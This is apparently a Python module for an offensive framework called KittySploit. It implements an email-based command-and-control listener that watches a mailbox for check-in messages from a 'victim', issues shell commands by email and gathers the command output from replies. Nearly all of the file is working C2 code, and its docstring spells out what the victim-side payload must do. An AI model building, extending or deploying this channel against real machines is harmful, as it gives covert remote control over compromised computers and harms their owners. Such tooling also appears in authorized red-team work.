#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Reverse Email (IMAP/SMTP) Listener

Listens to a mailbox via IMAP for "check-in" or response emails, and sends commands via SMTP.
- IMAP: read inbox, detect unread emails matching a subject prefix (e.g. [KS]), create session on first beacon
- SMTP: send command emails (subject = prefix + command_id, body = command)
- Responses: victim replies by email; body format: first line "CMD_ID: <id>", rest = output

A "valid connection" is the connection to the mail server (IMAP/SMTP), not when the client sends
a check-in: email is deferred/asynchronous, so the listener is considered active as soon as the
mailbox is reachable; the victim will communicate later via emails.

Setup:
1. Use a dedicated mailbox (Gmail: enable IMAP, use App Password)
2. Set subject_prefix (e.g. [KS]) so only matching emails are processed
3. Victim payload must: poll IMAP for new emails with that subject prefix, execute command, reply with CMD_ID + output
"""

from kittysploit import *
import threading
import time
import json
from email import policy
from email.parser import BytesParser
from typing import Optional, Dict, Any

try:
    import imaplib
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email.header import decode_header
    IMAP_SMTP_AVAILABLE = True
except ImportError:
    IMAP_SMTP_AVAILABLE = False


def _decode_mime_header(s):
    if not s:
        return ""
    try:
        parts = decode_header(s)
        out = []
        for part, enc in parts:
            if isinstance(part, bytes):
                out.append(part.decode(enc or "utf-8", errors="replace"))
            else:
                out.append(part)
        return "".join(out)
    except Exception:
        return str(s) if s else ""


def _get_email_body(msg) -> str:
    """Extract plain text body from message."""
    body = ""
    if msg.is_multipart():
        for part in msg.walk():
            ctype = part.get_content_type()
            if ctype == "text/plain":
                try:
                    payload = part.get_payload(decode=True)
                    if payload:
                        body = payload.decode(part.get_content_charset() or "utf-8", errors="replace")
                except Exception:
                    pass
                break
    else:
        try:
            payload = msg.get_payload(decode=True)
            if payload:
                body = payload.decode(msg.get_content_charset() or "utf-8", errors="replace")
        except Exception:
            pass
    return (body or "").strip()


def _parse_response_body(body: str) -> Optional[Dict[str, Any]]:
    """Parse response: first line CMD_ID: <id>, rest = output. Or JSON {command_id, output, status}."""
    if not body:
        return None
    # Try JSON first
    try:
        data = json.loads(body)
        if "command_id" in data or "output" in data:
            return {
                "command_id": data.get("command_id", "unknown"),
                "output": data.get("output", ""),
                "status": int(data.get("status", 0)),
                "error": data.get("error", ""),
            }
    except Exception:
        pass
    # Plain: first line "CMD_ID: xxx"
    lines = body.split("\n")
    if not lines:
        return None
    first = lines[0].strip()
    if first.upper().startswith("CMD_ID:"):
        cmd_id = first[7:].strip()
        output = "\n".join(lines[1:]).strip() if len(lines) > 1 else ""
        return {"command_id": cmd_id, "output": output, "status": 0, "error": ""}
    return None


class Module(Listener):
    """Reverse shell listener using email (IMAP inbox + SMTP send)."""

    __info__ = {
        "name": "reverse email",
        "description": "Listens to a mailbox via IMAP for beacon/response emails, sends commands via SMTP",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "handler": Handler.REVERSE,
        "session_type": SessionType.EMAIL,
        "dependencies": [],
    }

    # IMAP (read inbox)
    imap_host = OptString("imap.gmail.com", "IMAP server host", True)
    imap_port = OptPort(993, "IMAP port (993 SSL, 143 plain)", False)
    imap_user = OptString("", "IMAP username (email)", True)
    imap_password = OptString("", "IMAP password or App Password", True)
    use_ssl_imap = OptBool(True, "Use SSL for IMAP", False)
    mailbox = OptString("INBOX", "Mailbox to watch", False)

    # SMTP (send commands)
    smtp_host = OptString("smtp.gmail.com", "SMTP server host", True)
    smtp_port = OptPort(587, "SMTP port (587 TLS, 465 SSL)", False)
    smtp_user = OptString("", "SMTP username (often same as IMAP)", True)
    smtp_password = OptString("", "SMTP password or App Password", True)
    use_ssl_smtp = OptBool(False, "Use SSL for SMTP (port 465)", False)
    use_tls_smtp = OptBool(True, "Use STARTTLS for SMTP (port 587)", False)

    # C2 format
    subject_prefix = OptString("[KS]", "Subject prefix to match (beacon and responses)", True)
    poll_interval = OptInteger(15, "Polling interval in seconds", False)
    checkin_subject = OptString("CHECKIN", "Subject keyword for first beacon (match: prefix + this)", False)

    def _imap_connect(self):
        """Connect to IMAP and return connection (caller must logout)."""
        if not IMAP_SMTP_AVAILABLE:
            return None
        try:
            if self.use_ssl_imap:
                conn = imaplib.IMAP4_SSL(
                    str(self.imap_host),
                    int(self.imap_port)
                )
            else:
                conn = imaplib.IMAP4(str(self.imap_host), int(self.imap_port))
            conn.login(str(self.imap_user), str(self.imap_password))
            return conn
        except Exception as e:
            print_error(f"IMAP login failed: {e}")
            return None

    def _fetch_unseen_by_subject(self, conn, prefix: str):
        """Search UNSEEN emails whose subject contains prefix. Returns list of (uid, from_email, subject, body)."""
        results = []
        try:
            conn.select(str(self.mailbox), readonly=False)
            typ, data = conn.search(None, "UNSEEN")
            if typ != "OK" or not data[0]:
                return results
            uids = data[0].split()
            for uid in uids:
                typ, msg_data = conn.fetch(uid, "(RFC822)")
                if typ != "OK" or not msg_data:
                    continue
                raw = msg_data[0][1]
                msg = BytesParser(policy=policy.default).parsebytes(raw)
                subj = _decode_mime_header(msg.get("Subject", ""))
                if prefix and prefix not in subj:
                    continue
                from_hdr = msg.get("From", "")
                # Parse "Name <email>" or just "email"
                from_email = from_hdr
                if "<" in from_hdr and ">" in from_hdr:
                    from_email = from_hdr.split("<")[-1].split(">")[0].strip()
                body = _get_email_body(msg)
                results.append((uid, from_email.strip(), subj, body))
            return results
        except Exception as e:
            print_error(f"IMAP fetch error: {e}")
            return results

    def _mark_read(self, conn, uid):
        try:
            conn.store(uid, "+FLAGS", "\\Seen")
        except Exception:
            pass

    def run(self):
        """Run the email listener: verify mailbox connection, then return control. Check-in and responses run in background."""
        if not IMAP_SMTP_AVAILABLE:
            print_error("imaplib/smtplib not available (use Python standard library)")
            return False

        if not self.imap_user or not self.imap_password:
            print_error("imap_user and imap_password are required")
            return False

        # If listener already started (background thread running), just return None to keep prompt
        if getattr(self, "_email_listener_started", False):
            return None

        print_status("Connecting to IMAP...")
        conn = self._imap_connect()
        if not conn:
            return False
        try:
            conn.select(str(self.mailbox), readonly=False)
        except Exception as e:
            print_error("IMAP select failed: {}".format(e))
            try:
                conn.logout()
            except Exception:
                pass
            return False
        try:
            conn.logout()
        except Exception:
            pass

        # Connection valid = mailbox reachable: create session immediately so user can interact (sessions -i)
        prefix = (str(self.subject_prefix) or "[KS]").strip()
        target = "email-listener"
        port = 0
        connection_data = {
            "imap_host": str(self.imap_host),
            "imap_port": int(self.imap_port),
            "imap_user": str(self.imap_user),
            "imap_password": str(self.imap_password),
            "use_ssl_imap": bool(self.use_ssl_imap),
            "smtp_host": str(self.smtp_host),
            "smtp_port": int(self.smtp_port),
            "smtp_user": str(self.smtp_user),
            "smtp_password": str(self.smtp_password),
            "use_ssl_smtp": bool(self.use_ssl_smtp),
            "use_tls_smtp": bool(self.use_tls_smtp),
            "victim_email": "",
            "from_email": str(self.smtp_user),
            "subject_prefix": prefix,
            "mailbox": str(self.mailbox),
            "poll_interval": int(self.poll_interval),
            "listener_id": self.listener_id,
        }
        session_data = {
            "protocol": "email",
            "connection_type": "email",
            "connection_time": time.time(),
            "listener_type": "reverse_email",
            "handler": "reverse",
            "session_type": "email",
            "victim_email": "",
        }
        session_id = self._create_session("reverse", target, port, session_data)
        if not session_id:
            print_error("Failed to create session")
            return False
        conn_id = "{}:0".format(target)
        self.connections[conn_id] = connection_data
        self._session_connections[session_id] = connection_data
        self.stats["connections_received"] += 1
        self.session_id = session_id

        print_success("Mailbox connection OK. Session {} active. Waiting for check-in (subject: {} {}).".format(
            session_id,
            prefix,
            (str(self.checkin_subject) or "CHECKIN").strip(),
        ))
        print_info("Use 'sessions -i {}' to interact. Commands sent by email once victim checks in.".format(session_id))
        self.running = True
        self._email_listener_started = True
        self.polling_thread = threading.Thread(target=self._wait_checkin_then_poll, daemon=True)
        self.polling_thread.start()
        return session_id

    def run_with_auto_session(self):
        """Override: return session_id when mailbox is connected so user gets a session to interact with."""
        result = self.run()
        if result is None and getattr(self, "_email_listener_started", False):
            return getattr(self, "session_id", True)
        if result is False:
            return False
        if isinstance(result, str):
            return result
        if isinstance(result, bool):
            return result
        return result if result is not None else False

    def _wait_checkin_then_poll(self):
        """Background: wait for check-in email, attach victim to existing session, then poll for responses."""
        prefix = (str(self.subject_prefix) or "[KS]").strip()
        checkin_kw = (str(self.checkin_subject) or "CHECKIN").strip()
        interval = max(1, int(self.poll_interval))
        victim_attached = False

        # Phase 1: wait for check-in and attach victim to existing session
        while self.running and not victim_attached:
            try:
                conn = self._imap_connect()
                if not conn:
                    time.sleep(interval)
                    continue
                try:
                    emails = self._fetch_unseen_by_subject(conn, prefix)
                    for uid, from_email, subj, body in emails:
                        if checkin_kw.upper() in subj.upper():
                            self._mark_read(conn, uid)
                            victim_email = from_email.strip()
                            self._attach_victim(victim_email, prefix)
                            victim_attached = True
                            break
                finally:
                    try:
                        conn.logout()
                    except Exception:
                        pass
            except Exception as e:
                if self.running:
                    print_error("Check-in poll error: {}".format(e))
            time.sleep(interval)

        # Phase 2: poll for response emails
        if victim_attached and getattr(self, "session_id", None):
            self._poll_responses()
        self._email_listener_started = False

    def _attach_victim(self, victim_email: str, prefix: str):
        """Attach victim to existing session (update connection_data with victim_email)."""
        session_id = getattr(self, "session_id", None)
        if not session_id or session_id not in self._session_connections:
            return
        self._session_connections[session_id]["victim_email"] = victim_email
        conn_id = "{}:0".format("email-listener")
        if conn_id in self.connections:
            self.connections[conn_id]["victim_email"] = victim_email
        print_success("Victim {} checked in on session {}".format(victim_email, session_id))
        print_info("You can now send commands by email (sessions -i {}).".format(session_id))

    def _poll_responses(self):
        """Poll IMAP for response emails and push to shell's _store_response."""
        prefix = (str(self.subject_prefix) or "[KS]").strip()
        interval = max(1, int(self.poll_interval))
        seen_uids = set()

        while getattr(self, "running", True):
            try:
                conn = self._imap_connect()
                if not conn:
                    time.sleep(interval)
                    continue
                try:
                    conn.select(str(self.mailbox), readonly=False)
                    typ, data = conn.search(None, "ALL")
                    if typ != "OK" or not data[0]:
                        time.sleep(interval)
                        continue
                    uids = data[0].split()
                    for uid in uids:
                        if uid in seen_uids:
                            continue
                        typ, msg_data = conn.fetch(uid, "(RFC822)")
                        if typ != "OK" or not msg_data:
                            continue
                        raw = msg_data[0][1]
                        msg = BytesParser(policy=policy.default).parsebytes(raw)
                        subj = _decode_mime_header(msg.get("Subject", ""))
                        if prefix not in subj:
                            continue
                        body = _get_email_body(msg)
                        parsed = _parse_response_body(body)
                        if not parsed:
                            continue
                        seen_uids.add(uid)
                        self._mark_read(conn, uid)
                        cmd_id = parsed.get("command_id", "unknown")
                        output = parsed.get("output", "")
                        status = parsed.get("status", 0)
                        error = parsed.get("error", "")
                        if self.session_id and self.framework:
                            shell = self.framework.shell_manager.get_shell(self.session_id)
                            if shell and hasattr(shell, "_store_response"):
                                shell._store_response(cmd_id, output, status, error)
                        if output:
                            print_info("[Response] {}".format(output[:200] + "..." if len(output) > 200 else output))
                finally:
                    try:
                        conn.logout()
                    except Exception:
                        pass
            except Exception as e:
                if getattr(self, "running", True):
                    print_error("Poll error: {}".format(e))
            time.sleep(interval)

    def send_command(self, command: str) -> bool:
        """Send a command via SMTP (used by shell)."""
        return True  # Shell sends via its own SMTP

    def stop(self):
        """Stop the listener."""
        self.running = False
        self._email_listener_started = False
        if getattr(self, "polling_thread", None) and self.polling_thread.is_alive():
            self.polling_thread.join(timeout=5)
        print_success("Email listener stopped")
        return True

    def shutdown(self):
        return self.stop()
